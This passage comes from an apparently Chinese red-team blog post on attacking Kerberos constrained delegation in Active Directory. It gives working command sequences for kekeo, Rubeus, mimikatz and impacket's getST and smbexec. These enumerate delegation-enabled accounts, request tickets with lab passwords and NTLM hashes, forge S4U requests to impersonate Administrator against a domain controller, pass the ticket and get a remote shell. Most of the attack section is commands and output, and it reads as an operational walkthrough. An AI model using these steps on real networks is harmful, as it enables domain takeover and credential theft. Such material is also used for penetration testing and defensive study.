+SharpLDAPSearch.exe &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; &quot;samaccountname&quot;
+</code></pre>
+<figure data-type="image" tabindex="31"><img src="https://redteamblog.icu/post-images/assets/image-20220529174937-a8mfqve.png" alt="image.png" loading="lazy"></figure>
+<h4 id="powerviewps1">PowerView.ps1</h4>
+<pre><code>#查找域中配置约束委派的主机
+powershell.exe -exec bypass -Command &quot;&amp; {Import-Module .\PowerView.ps1;Get-DomainComputer -Domain redteam.com -TrustedToAuth -Properties distinguishedname,samaccountname,useraccountcontrol,msds-allowedtodelegateto|fl}&quot;
+
+#查找域中配置约束委派的服务账户
+powershell.exe -exec bypass -Command &quot;&amp; {Import-Module .\PowerView.ps1;Get-DomainUser -Domain redteam.com –TrustedToAuth -Properties distinguishedname,samaccountname,useraccountcontrol,msds-allowedtodelegateto|fl}&quot;
+</code></pre>
+<h4 id="sharpviewexe-2">SharpView.exe</h4>
+<pre><code>#查找域中配置约束委派的主机
+SharpView.exe Get-DomainComputer -Domain redteam.com -TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto 
+
+#查找域中配置约束委派的服务账户
+SharpView.exe Get-DomainUser -Domain redteam.com -LDAPFilter msds-allowedtodelegateto=* -Properties distinguishedname,samaccountname,useraccountcontrol,msds-allowedtodelegateto
+</code></pre>
+<h3 id="约束性委派攻击利用">约束性委派攻击利用</h3>
+<p>https://blog.csdn.net/qq_36119192/article/details/104538160</p>
+<p>https://www.redteaming.top/2020/02/11/域渗透——Kerberos委派攻击/</p>
+<p><em>域外机器也执行</em></p>
+<p>服务用户只能获取某个用户（或主机）的服务的 ST，所以只能模拟用户访问特定的服务，是无法获取用户的 TGT，如果我们能获取到开启了约束委派的服务用户的明文密码或者 <code>NTLM Hash</code> ，我们就可以伪造 S4U 请求，进而伪装成服务用户以任意账户的权限申请访问指定服务的 ST。</p>
+<p>已经知道服务用户明文的条件下，我们可以用<a href="https://github.com/gentilkiwi/kekeo">kekeo</a>请求该用户的 TGT。</p>
+<p>注：</p>
+<p>在Windows系统中，普通用户的属性中没有委派（Delegation）这个选项卡，只有服务账号、主机账号才有。</p>
+<p>服务账号（Service Account），域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如MS <a href="https://cloud.tencent.com/product/sqlserver?from=10680">SQL Server</a>在安装时，会在域内自动注册服务账号 SqlServiceAccount，这类账号不能用于交互式登录。</p>
+<h4 id="使用kekeo">使用kekeo</h4>
+<p><a href="https://github.com/gentilkiwi/kekeo/releases/">kekeo</a></p>
+<p>1.使用kekeo申请TGT票据</p>
+<pre><code class="language-mv">#密码明文方式
+tgt::ask /user:test /domain:redteam.com /password:P@ssw0rd
+
+kekeo.exe &quot;tgt::ask /user:SqlServer /domain:redteam.com /password:S123456@#!1&quot; &quot;exit&quot;
+
+#密码NTLM方式
+kekeo.exe &quot;tgt::ask /user:SqlServer /domain:redteam.com /NTLM:77e3527e2a110b7e30659749718f54f9&quot; &quot;exit&quot;
+</code></pre>
+<figure data-type="image" tabindex="32"><img src="https://redteamblog.icu/post-images/assets/image-20220529181234-z1vdd29.png" alt="image.png" loading="lazy"></figure>
+<p>2.请求域控CISF服务的ST票据</p>
+<p>使用这张 TGT 通过伪造 S4U 请求以 <code>administrator</code> 用户身份请求访问 <code>DC CIFS</code> 的 ST</p>
+<pre><code class="language-mv">#需要使用上面申请的TGT票据
+kekeo.exe &quot;tgs::s4u /tgt:TGT_SqlServer@REDTEAM.COM_krbtgt~redteam.com@REDTEAM.COM.kirbi /user:Administrator@redteam.com /service:cifs/dc.redteam.com&quot; &quot;exit&quot;
+</code></pre>
+<figure data-type="image" tabindex="33"><img src="https://redteamblog.icu/post-images/assets/image-20220529181535-v958h3z.png" alt="image.png" loading="lazy"></figure>
+<p>结果生成了两张ST票据，一张是通过S4U2Self请求SqlServer自身的ST票据，一张是通过S4U2Proxy获得的请求CIFS的ST票据</p>
+<p>然后用 域内机器上mimikatz 将 ST2 导入当前会话，即可成功访问域控 <code>DC</code></p>
+<pre><code class="language-mv">mimikatz.exe &quot;kerberos::ptt TGS_Administrator@redteam.com@REDTEAM.COM_cifs~dc.redteam.com@REDTEAM.COM.kirbi&quot; &quot;exit&quot;
+</code></pre>
+<figure data-type="image" tabindex="34"><img src="https://redteamblog.icu/post-images/assets/image-20220529194117-goyzvvy.png" alt="image.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="35"><img src="https://redteamblog.icu/post-images/assets/image-20220529192936-1h85y3n.png" alt="image.png" loading="lazy"></figure>
+<p>成功访问到域控资源。</p>
+<p>如果不知道服务用户明文的情况下，kekeo 同样也支持使用 NTLM Hash，在请求服务用户的 TGT 那步直接把 <code>/password</code> 改成 <code>/NTLM</code> 即可</p>
+<pre><code class="language-powershell"># kekeo
+tgt::ask /user:test /domain:zjun.com /NTLM:e19ccf75ee54e06b06a5907af13cef42
+</code></pre>
+<p>如果不知道服务用户的明文和 NTLM Hash，但是已有服务用户登陆的主机的本地管理员权限，可以用 mimikatz 直接从内存中把服务用户的 TGT 导出</p>
+<pre><code class="language-powershell">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit
+</code></pre>
+<figure data-type="image" tabindex="36"><img src="https://oss.zjun.info/zjun.info/202202162118805.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt="image-20220216211846338" loading="lazy"></figure>
+<p>服务用户的 TGT 导出后，就可以通过伪造 S4U 请求以 <code>administrator</code> 用户身份请求访问 <code>P-DC CIFS</code> 的 ST</p>
+<pre><code class="language-powershell"># kekeo
+tgs::s4u /tgt:[0;8f613]-2-0-40e10000-test@krbtgt-ZJUN.COM.kirbi /user:Administrator@zjun
+</code></pre>
+<h4 id="使用rubeus">使用Rubeus</h4>
+<p>和上面的流程一样，就不贴图了</p>
+<pre><code>#因为Rubeus不支持明文密码，所以先转换成hash
+Rubeus.exe hash /password:S123456@#!1
+
+#1.申请TGT票据，获得base64格式的TGT
+Rubeus.exe asktgt /user:SqlServer /rc4:77E3527E2A110B7E30659749718F54F9 /domain:redteam.com
+
+#2.powershell下转换为正常格式
+[IO.File]::WriteAllBytes(&quot;.\ticket.kirbi&quot;, [Convert]::FromBase64String(&quot;去掉换行后的base64&quot;))
+
+#3.请求域控CISF服务的ST票据并注入
+Rubeus.exe s4u /ticket:ticket.kirbi /impersonateuser:administrator /msdsspn:cifs/dc.redteam.com /ptt
+</code></pre>
+<p>一步到位：</p>
+<pre><code class="language-net">Rubeus.exe s4u /user:SqlServer /rc4:77E3527E2A110B7E30659749718F54F9 /impersonateuser:administrator /msdsspn:cifs/dc.redteam.com /ptt
+</code></pre>
+<figure data-type="image" tabindex="37"><img src="https://redteamblog.icu/post-images/assets/clip_32-20220512161559-mup9dzr.png" alt="Image" title="Image" loading="lazy"></figure>
+<h4 id="使用impacket包">使用impacket包</h4>
+<p>执行命令的话建议选择impacket包，用mimikatz进行ptc的话也是用不了impacket包的如smbexec工具执行命令的,需要指定KRB5CCNAME</p>
+<pre><code>#1. 请求访问域控CIFS的ST票据
+#impersonate：伪造用户
+#spn：要委派的服务的spn
+#dc-ip：域控ip
+python3 getST.py -dc-ip 172.16.1.1 -impersonate administrator bean/SqlServer:S123456@#!1 -spn cifs/dc.bean.testlab
+
+#2. 导入cache
+##2.1 Windows下
+set KRB5CCNAME=administrator.ccache
+##2.2 Linux下
+export KRB5CCNAME=administrator.ccache
+
+#3. 拿到域控权限
+python3 smbexec.py -no-pass -k dc.bean.testlab
+
+</code></pre>
+<figure data-type="image" tabindex="38"><img src="https://redteamblog.icu/post-images/assets/clip_31-20220512161559-16zwk36.png" alt="Image" title="Image" loading="lazy"></figure>
+<h1 id="参考">参考</h1>
+<p>https://www.anquanke.com/post/id/173477<br>
+https://blog.zjun.info/tech/kerberos-domain-delegation-attack/<br>
+https://cloud.tencent.com/developer/article/1899592</p>
+
+        </div>
+        <!-- Share to Twitter, Weibo, Telegram -->
+        <div class="flex items-center">
+          <div class="mr-4 flex items-center">
+            <i class="ri-share-forward-line text-gray-500"></i>
+          </div>
+          <div class="px-4 cursor-pointer text-blue-500 hover:bg-blue-100 dark:hover:bg-gray-600 inline-flex" @click="shareToTwitter">
+            <i class="ri-twitter-line"></i>
+          </div>
+          <div class="px-4 cursor-pointer text-red-500 hover:bg-red-100 dark:hover:bg-gray-600 inline-flex" @click="shareToWeibo">
+            <i class="ri-weibo-line"></i>
+          </div>
+          <div class="px-4 cursor-pointer text-indigo-500 hover:bg-indigo-100 dark:hover:bg-gray-600 inline-flex" @click="shareToTelegram">
+            <i class="ri-telegram-line"></i>
+          </div>
+        </div>
+      </div>
+
+      
+
+      
+        <div id="vlaine-comment"></div>
+      
+
+      <footer class="py-12 text-center px-4 md:px-0" v-pre>
+  
+</footer>
+    </div>
+
+    <!-- TOC Container -->
+    <div class="fixed right-0 bottom-0 mb-16 mr-4 shadow w-8 h-8 rounded-full flex justify-center items-center z-10 cursor-pointer bg-white dark:bg-gray-500 dark:text-gray-200 hover:shadow-lg transition-all animated fadeInRight" @click="showToc = true">
+      <i class="ri-file-list-line"></i>
+    </div>
+
+    <div class="fixed right-0 top-0 bottom-0 overflow-y-auto w-64 bg-white dark:bg-gray-800 p-4 border-l border-gray-100 dark:border-gray-600 z-10 transition-fast" :class="{ '-mr-64': !showToc }">
+      <div class="flex mb-4 justify-end">
+        <div class="w-8 h-8 inline-flex justify-center items-center rounded-full cursor-pointer hover:bg-gray-200 dark:hover:bg-gray-600 transition-fast" @click="showToc = false">
+          <i class="ri-close-line text-lg"></i>
+        </div>
+      </div>
+      <div class="post-toc-container">
+        <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E5%A7%94%E6%B4%BE%E5%89%8D%E6%8F%90">委派前提</a></li>
+<li><a href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE">非约束委派</a>
+<ul>
+<li><a href="#%E7%AE%80%E4%BB%8B%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95">简介&amp;&amp;配置方法</a></li>
+<li><a href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%B5%81%E7%A8%8B">非约束委派流程</a></li>
+<li><a href="#%E6%9F%A5%E6%89%BE%E5%9F%9F%E4%B8%AD%E9%85%8D%E7%BD%AE%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E4%B8%BB%E6%9C%BA%E6%9C%8D%E5%8A%A1%E8%B4%A6%E6%88%B7">查找域中配置非约束委派的主机/服务账户</a>
+<ul>
+<li><a href="#adfind%E5%8F%AF%E5%9C%A8%E5%9F%9F%E5%A4%96%E6%9F%A5%E8%AF%A2">AdFind（可在域外查询）</a></li>
+<li><a href="#sharpldapsearch">SharpLDAPSearch</a></li>
+<li><a href="#%E4%BD%BF%E7%94%A8powerviewps1">使用PowerView.ps1</a></li>
+<li><a href="#sharpviewexe">SharpView.exe</a></li>
+</ul>
+</li>
+<li><a href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8">非约束性委派攻击利用</a>
+<ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF">利用场景</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90">利用前提</a></li>
+<li><a href="#%E6%A8%A1%E6%8B%9F%E5%9F%9F%E7%AE%A1%E5%8E%BB%E8%AE%BF%E9%97%AE%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E4%B8%BB%E6%9C%BA">模拟域管去访问非约束性委派主机</a></li>
+</ul>
+</li>
+<li><a href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BEspooler%E5%88%A9%E7%94%A8">非约束委派+Spooler利用</a></li>
+</ul>
+</li>
+<li><a href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE">约束委派</a>
+<ul>
+<li><a href="#%E7%AE%80%E4%BB%8B%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95-2">简介&amp;配置方法</a></li>
+<li><a href="#%E5%B0%8F%E6%8F%90%E7%A4%BA"><strong>小提示</strong></a></li>
+<li><a href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%B5%81%E7%A8%8B">约束委派流程</a></li>
+<li><a href="#%E6%9F%A5%E6%89%BE%E5%9F%9F%E4%B8%AD%E9%85%8D%E7%BD%AE%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E4%B8%BB%E6%9C%BA%E6%9C%8D%E5%8A%A1%E8%B4%A6%E6%88%B7">查找域中配置约束委派的主机/服务账户</a>
+<ul>
+<li><a href="#adfind%E5%8F%AF%E5%9C%A8%E5%9F%9F%E5%A4%96%E6%9F%A5%E8%AF%A2-2">AdFind（可在域外查询）</a></li>
+<li><a href="#sharpldapsearch-2">SharpLDAPSearch</a></li>
+<li><a href="#powerviewps1">PowerView.ps1</a></li>
+<li><a href="#sharpviewexe-2">SharpView.exe</a></li>
+</ul>
+</li>
+<li><a href="#%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8">约束性委派攻击利用</a>
+<ul>
+<li><a href="#%E4%BD%BF%E7%94%A8kekeo">使用kekeo</a></li>
+<li><a href="#%E4%BD%BF%E7%94%A8rubeus">使用Rubeus</a></li>
+<li><a href="#%E4%BD%BF%E7%94%A8impacket%E5%8C%85">使用impacket包</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
+</ul>
+
+      </div>
+    </div>
+
+    <!-- Back to top -->
+    <div class="fixed right-0 bottom-0 mb-4 mr-4 shadow w-8 h-8 rounded-full flex justify-center items-center z-10 cursor-pointer bg-white hover:shadow-lg transition-all dark:bg-gray-500 dark:text-gray-200" @click="backToUp" v-show="scrolled">
+      <i class="ri-arrow-up-line"></i>
+    </div>
+  </div>
+
+  <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+  <!-- Background of PhotoSwipe. 
+        It's a separate element as animating opacity is faster than rgba(). -->
+  <div class="pswp__bg">
+  </div>
+  <!-- Slides wrapper with overflow:hidden. -->
+  <div class="pswp__scroll-wrap">
+    <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+    <div class="pswp__container">
+      <div class="pswp__item">
+      </div>
+      <div class="pswp__item">
+      </div>
+      <div class="pswp__item">
+      </div>
+    </div>
+    <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+    <div class="pswp__ui pswp__ui--hidden">
+      <div class="pswp__top-bar">
+        <!--  Controls are self-explanatory. Order can be changed. -->
+        <div class="pswp__counter">
+        </div>
+        <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+        <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+        <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+        <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+        <!-- element will get class pswp__preloader--active when preloader is running -->
+        <div class="pswp__preloader">
+          <div class="pswp__preloader__icn">
+            <div class="pswp__preloader__cut">
+              <div class="pswp__preloader__donut">
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+        <div class="pswp__share-tooltip">
+        </div>
+      </div>
+      <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+      </button>
+      <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+      </button>
+      <div class="pswp__caption">
+        <div class="pswp__caption__center">
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+  <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+  <script src="https://redteamblog.icu/media/scripts/main.js"></script>
+  
+  <!-- Code Highlight -->
+  
+    <script src="https://redteamblog.icu/media/prism.js"></script>
+    <script>
+      Prism.highlightAll()
+    </script>
+  
+
+  <script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+  <script>
+    //拿到预览框架，也就是上面的html代码
+    var pswpElement = document.querySelectorAll('.pswp')[0];
+    //定义图片数组变量
+    var imgitems;
+    /**
+    * 用于显示预览界面
+    * @param index 图片数组下标
+    */
+    function viewImg(index) {
+      //其它选项这里不做过多阐述，详情见官网
+      var pswpoptions = {
+        index: parseInt(index, 10), // 开始幻灯片索引。0是第一张幻灯片。必须是整数，而不是字符串。
+        bgOpacity: 0.7, // 背景透明度，0-1
+        maxSpreadZoom: 3, // 缩放级别，不要太大
+      };
+      //初始化并打开PhotoSwipe，pswpElement对应上面预览框架，PhotoSwipeUI_Default为皮肤，imgitems为图片数组，pswpoptions为选项
+      var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, imgitems, pswpoptions);
+      gallery.init()
+    }
+    /**
+    * 用于添加图片点击事件
+    * @param img 图片元素
+    * @param index 所属下标（在imgitems中的位置）
+    */
+    function addImgClick(img, index) {
+      img.onclick = function() {
+        viewImg(index)
+      }
+    }
+    /**
+    * 轮询所有图片，获取src、width、height等数据，加入imgitems，并给图片元素添加事件
+    * 最好在onload中执行该方法，本站因放在最底部，所以直接初始化
+    * 异步加载图片可在图片元素创建完成后调用此方法
+    */
+    function initImg() {
+      //重置图片数组
+      imgitems = [];
+      //查找class:markdown 下的所有img元素并遍历
+      var imgs = document.querySelectorAll('.markdown img');
+      for (var i = 0; i < imgs.length; i++) {
+        var img = imgs[i];
+        //本站相册初始为loading图片，真实图片放在data-src
+        var ds = img.getAttribute("data-src");
+        //创建image对象，用于获取图片宽高
+        var imgtemp = new Image();
+        //判断是否存在data-src
+        if (ds != null && ds.length > 0) {
+          imgtemp.src = ds
+        } else {
+          imgtemp.src = img.src
+        }
+        //判断是否存在缓存
+        if (imgtemp.complete) {
+          var imgobj = {
+            "src": imgtemp.src,
+            "w": imgtemp.width,
+            "h": imgtemp.height,
+          };
+          imgitems[i] = imgobj;
+          addImgClick(img, i);
+        } else {
+          console.log('进来了2')
+          imgtemp.index = i;
+          imgtemp.img = img;
+          imgtemp.onload = function() {
+            var imgobj = {
+              "src": this.src,
+              "w": this.width,
+              "h": this.height,
+            };
+            //不要使用push，因为onload前后顺序会不同
+            imgitems[this.index] = imgobj
+            //添加点击事件
+            addImgClick(this.img, this.index);
+          }
+        }
+      }
+    }
+    //初始化
+    initImg();
+  </script>
+  
+    <script type="application/javascript" src="https://unpkg.com/valine"></script>
+<script type="application/javascript">
+  new Valine({
+    el: '#vlaine-comment',
+    appId: 'Ik52EhrTkYU8moKHOkLSm7bp-gzGzoHsz',
+    appKey: 'o582DpzvYHyL0Gpu3SaatYO7',
+    pageSize: 10,
+    notify: true,
+    avatar: 'mp',
+    verify: true,
+    placeholder: '来都来了，不妨评论一下',
+    visitor: true,
+    highlight: false,
+    recordIP: false,
+  })
+</script>
+  
+  
+</body>
+
+</html>
